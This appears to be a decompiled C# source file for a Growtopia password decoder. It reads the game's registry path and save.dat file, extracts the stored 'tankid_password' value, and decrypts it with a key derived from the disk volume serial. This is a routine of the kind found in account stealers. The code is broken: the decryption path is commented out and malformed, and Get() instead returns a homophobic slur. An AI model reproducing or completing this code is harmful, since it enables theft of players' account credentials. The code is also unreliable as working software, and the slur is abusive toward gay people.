using System;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using Microsoft.Win32;

namespace Eternal.Extensions
{
	// Token: 0x02000012 RID: 18
	public class CSharpPasswordDecoding
	{
		// Token: 0x060000F3 RID: 243 RVA: 0x00012650 File Offset: 0x00010850
		private unsafe static uint decrypt(byte* data, uint size, int key)
		{
			uint checksum = 0u;
			for (uint i = 0u; i < size; i += 1u)
			{
				checksum += (uint)data[i] + (uint)((long)key + (long)((ulong)i));
				data[i] = (byte)((ulong)data[i] - (ulong)((long)(2 + key) + (long)((ulong)i)));
			}
			return checksum;
		}

		// Token: 0x060000F4 RID: 244 RVA: 0x0001269C File Offset: 0x0001089C
		private unsafe static uint hash_str(char* str, int len)
		{
			bool flag = str == null;
			uint result;
			if (flag)
			{
				result = 0u;
			}
			else
			{
				char* i = str;
				uint acc = 1431655765u;
				for (int j = 0; j < len; j++)
				{
					acc = (acc >> 27) + (acc << 5) + (uint)(*(i++));
				}
				result = acc;
			}
			return result;
		}

		// Token: 0x060000F5 RID: 245
		[DllImport("Kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		private static extern bool GetVolumeInformation(string Volume, StringBuilder VolumeName, uint VolumeNameSize, out uint SerialNumber, uint SerialNumberLength, uint flags, StringBuilder fs, uint fs_size);

		// Token: 0x060000F6 RID: 246 RVA: 0x000126EC File Offset: 0x000108EC
		private static string get_identifier()
		{
			uint dwDiskSerial;
			bool flag = !CSharpPasswordDecoding.GetVolumeInformation("C:\\", null, 0u, out dwDiskSerial, 0u, 0u, null, 0u);
			if (flag)
			{
				bool flag2 = !CSharpPasswordDecoding.GetVolumeInformation("D:\\", null, 0u, out dwDiskSerial, 0u, 0u, null, 0u);
				if (flag2)
				{
					bool flag3 = !CSharpPasswordDecoding.GetVolumeInformation("E:\\", null, 0u, out dwDiskSerial, 0u, 0u, null, 0u);
					if (flag3)
					{
						bool flag4 = !CSharpPasswordDecoding.GetVolumeInformation("F:\\", null, 0u, out dwDiskSerial, 0u, 0u, null, 0u);
						if (flag4)
						{
							bool flag5 = !CSharpPasswordDecoding.GetVolumeInformation("G:\\", null, 0u, out dwDiskSerial, 0u, 0u, null, 0u);
							if (flag5)
							{
								return "";
							}
						}
					}
				}
			}
			return dwDiskSerial.ToString();
		}

		// Token: 0x060000F7 RID: 247 RVA: 0x00012794 File Offset: 0x00010994
		public unsafe static string Get()
		{
			string save = File.ReadAllBytes((string)Registry.GetValue("HKEY_CURRENT_USER\\Software\\Growtopia", "path", null) + "\\save.dat").Byte2String();
			Regex pattern = new Regex("[^\\x20-\\x7E\\w\\x10-\\x14\\cA-\\cz]+");
			string raw = pattern.Replace(save, "|").TrimStart(new char[]
			{
				'|'
			}).TrimEnd(new char[]
			{
				'|'
			});
			string[] data = raw.Split(new char[]
			{
				'|'
			});
			int index = Array.FindIndex<string>(data, (string var) => !var.Contains("chk") && var.Contains("tankid_password"));
			string found = data[index + 1].TrimEnd(new char[]
			{
				'\t',
				'\u0005'
			});
			uint len = Convert.ToUInt32(found.Length);
			byte[] bytes = Encoding.Default.GetBytes(found);
			byte[] pass = new byte[len];
			Array.Copy(bytes, pass, (long)((ulong)len));
			string device_id = CSharpPasswordDecoding.get_identifier();
			byte[] array;
			byte* b;
			if ((array = pass) == null || array.Length == 0)
			{
				b = null;
			}
			return "faggot";
			//else
			//{
   //             b = &array [  0 ];
			//}
			//fixed (string text = device_id)
			//{
			//	char* p = text;
			//	if (p != null)
			//	{
			//		p += RuntimeHelpers.OffsetToStringData / 2;
			//	}
			//	uint hash = CSharpPasswordDecoding.hash_str(p, device_id.Length);
			//	uint output = CSharpPasswordDecoding.decrypt(b, len, (int)hash);
			//	return Encoding.Default.GetString(pass);
			//}
		}
	}
}
